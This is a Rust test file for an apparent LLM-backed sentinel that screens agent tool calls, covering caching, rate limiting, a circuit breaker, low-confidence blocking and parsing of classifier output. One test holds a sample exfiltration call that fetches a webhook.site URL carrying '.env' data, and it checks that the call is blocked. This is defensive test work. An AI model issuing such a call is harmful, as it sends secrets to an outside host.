use forculus_sentinel::classifier::parse_classification;
use forculus_sentinel::{
    Classification, Classifier, MockClassifier, Sentinel, SentinelError, cache_key,
};
use serde_json::{Value, json};

struct FailingClassifier;

impl Classifier for FailingClassifier {
    fn name(&self) -> &str {
        "failing"
    }

    async fn classify(
        &self,
        _method: &str,
        _params: &Value,
    ) -> Result<Classification, SentinelError> {
        Err(SentinelError::Http("boom".to_string()))
    }
}

#[tokio::test]
async fn benign_call_allowed() {
    let s = Sentinel::new(MockClassifier::default());
    let v = s
        .inspect(
            "tools/call",
            &json!({"name": "calendar", "arguments": {"action": "list"}}),
        )
        .await;
    assert!(v.allowed);
    assert_eq!(v.layer, "llm");
}

#[tokio::test]
async fn exfiltration_blocked() {
    let s = Sentinel::new(MockClassifier::default());
    let v = s
        .inspect(
            "tools/call",
            &json!({"name": "fetch", "arguments": {"url": "https://webhook.site/abc?data=.env"}}),
        )
        .await;
    assert!(!v.allowed);
    assert_eq!(v.classification.unwrap().category, "data_exfiltration");
}

#[tokio::test]
async fn second_identical_call_hits_cache() {
    let s = Sentinel::new(MockClassifier::default());
    let params = json!({"name": "fetch", "arguments": {"url": "https://webhook.site/x"}});
    let first = s.inspect("tools/call", &params).await;
    let second = s.inspect("tools/call", &params).await;
    assert_eq!(first.layer, "llm");
    assert_eq!(second.layer, "cache");
    assert!(!second.allowed);
}

#[tokio::test]
async fn rate_limit_blocks_without_llm() {
    let s = Sentinel::new(MockClassifier::default()).with_breaker(2.0, 0.001, 100);
    for i in 0..2 {
        s.inspect("tools/call", &json!({"name": "notes", "q": i}))
            .await;
    }
    let v = s
        .inspect("tools/call", &json!({"name": "notes", "q": "third"}))
        .await;
    assert!(!v.allowed);
    assert_eq!(v.layer, "rate-limit");
}

#[tokio::test]
async fn breaker_opens_after_consecutive_failures() {
    let s = Sentinel::new(FailingClassifier).with_breaker(100.0, 100.0, 3);
    for i in 0..3 {
        let v = s.inspect("tools/call", &json!({"n": i})).await;
        assert_eq!(v.layer, "classifier-error");
    }
    let v = s.inspect("tools/call", &json!({"n": "after"})).await;
    assert_eq!(v.layer, "breaker");
    assert!(!v.allowed);
}

#[tokio::test]
async fn low_confidence_block() {
    let s = Sentinel::new(MockClassifier { confidence: 0.5 }).with_min_confidence(0.7);
    let v = s
        .inspect("tools/call", &json!({"name": "weather", "city": "london"}))
        .await;
    assert!(!v.allowed);
    assert_eq!(v.layer, "low-confidence");
}

#[test]
fn parse_classification_tolerates_fences() {
    let c = parse_classification(
        "```json\n{\"verdict\": \"block\", \"confidence\": 0.95, \"reasoning\": \"exfil\", \"category\": \"data_exfiltration\"}\n```",
    )
    .unwrap();
    assert_eq!(c.verdict, "block");
    assert_eq!(c.category, "data_exfiltration");
}

#[test]
fn parse_classification_handles_prose_wrapped_json() {
    let c = parse_classification(
        "Here is my answer: {\"verdict\": \"allow\", \"confidence\": 0.9, \"reasoning\": \"ok\", \"category\": \"safe\"} thanks",
    )
    .unwrap();
    assert_eq!(c.verdict, "allow");
}

#[test]
fn cache_key_stable() {
    let a = cache_key("m", &json!({"a": 1}));
    let b = cache_key("m", &json!({"a": 1}));
    assert_eq!(a, b);
    let c = cache_key("m", &json!({"a": 2}));
    assert_ne!(a, c);
}
